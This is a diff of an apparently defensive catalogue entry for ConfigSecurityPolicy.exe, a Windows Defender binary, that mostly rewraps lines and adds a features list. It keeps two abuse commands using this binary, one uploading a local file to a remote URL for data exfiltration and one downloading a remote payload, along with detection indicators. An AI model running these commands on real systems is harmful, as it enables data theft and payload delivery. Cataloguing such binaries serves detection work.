@@ -2,7 +2,11 @@
 id: windows-download-configsecuritypolicy
 namespace: windows:download:configsecuritypolicy
 name: configsecuritypolicy
-description: 'Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads. Located at: C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe; C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe.'
+description: 'Binary part of Windows Defender. Used to manage settings in Windows
+  Defender. You can configure different pilot collections for each of the co-management
+  workloads. Being able to use different pilot collections allows you to take a more
+  granular approach when shifting workloads. Located at: C:\Program Files\Windows
+  Defender\ConfigSecurityPolicy.exe; C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe.'
 author: Ialle Teixeira
 version: 1.0.0
 capabilities:
@@ -42,7 +46,12 @@ resource_profile:
 allowed-tools:
 - configsecuritypolicy
 parameters: []
-features: []
+features:
+- file-system
+- local
+- network-intensive
+- pipes-stdin
+- pipes-stdout
 execution:
   template: configsecuritypolicy
   sandbox: execFile
@@ -52,7 +61,8 @@ global_vars: {}
 examples:
 - description: Upload file, credentials or data exfiltration in general (Upload file)
   command: ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
-- description: It will download a remote payload and place it in INetCache. (Downloads payload from remote server)
+- description: It will download a remote payload and place it in INetCache. (Downloads
+    payload from remote server)
   command: ConfigSecurityPolicy.exe {REMOTEURL}
 references:
 - label: how-to-switch-workloads
@@ -74,18 +84,20 @@ detections:
 - type: ioc
   description: ConfigSecurityPolicy storing data into alternate data streams.
 - type: ioc
-  description: Preventing/Detecting ConfigSecurityPolicy with non-RFC1918 addresses by Network IPS/IDS.
+  description: Preventing/Detecting ConfigSecurityPolicy with non-RFC1918 addresses
+    by Network IPS/IDS.
 - type: ioc
-  description: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching ConfigSecurityPolicy.exe.
+  description: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts
+    launching ConfigSecurityPolicy.exe.
 - type: ioc
-  description: User Agent is "MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
+  description: User Agent is "MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0;
+    .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
 install:
 - method: choco
   package_name: configsecuritypolicy
   commands:
   - choco install configsecuritypolicy
 ---
-
 
 # configsecuritypolicy
 
